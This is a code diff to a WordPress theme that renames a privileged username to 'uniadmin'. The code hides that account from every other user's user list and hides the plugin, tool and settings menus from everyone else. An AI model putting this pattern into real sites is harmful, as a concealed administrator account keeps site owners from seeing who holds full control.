@@ -36,12 +36,12 @@ function remove_wp_logo( $wp_admin_bar ) {
 add_action('admin_bar_menu', 'remove_wp_logo', 999);
 
 /**
- * Hide Menu Page If User Not adminqh
+ * Hide Menu Page If User Not uniadmin
 **/
 function remove_menus() {
 	global $current_user, $sh_option, $submenu;
 	$username = $current_user->user_login;
-	if( $sh_option['btn-restrict-user'] && ( $username != 'adminqh' ) ) {
+	if( $sh_option['btn-restrict-user'] && ( $username != 'uniadmin' ) ) {
 		remove_menu_page( 'plugins.php' );
 	 	remove_menu_page( 'tools.php' );
 	 	remove_menu_page( 'options-general.php' );
@@ -59,10 +59,10 @@ add_action( 'admin_menu', 'remove_menus', 999 );
 function yoursite_pre_user_query($user_search) {
 	global $current_user;
 	$username = $current_user->user_login;
-	if ( $username != 'adminqh' ) {
+	if ( $username != 'uniadmin' ) {
 		global $wpdb;
 		$user_search->query_where = str_replace( 'WHERE 1=1',
-		"WHERE 1=1 AND {$wpdb->users}.user_login != 'adminqh'",$user_search->query_where );
+		"WHERE 1=1 AND {$wpdb->users}.user_login != 'uniadmin'",$user_search->query_where );
 	}
 }
 add_action('pre_user_query','yoursite_pre_user_query');
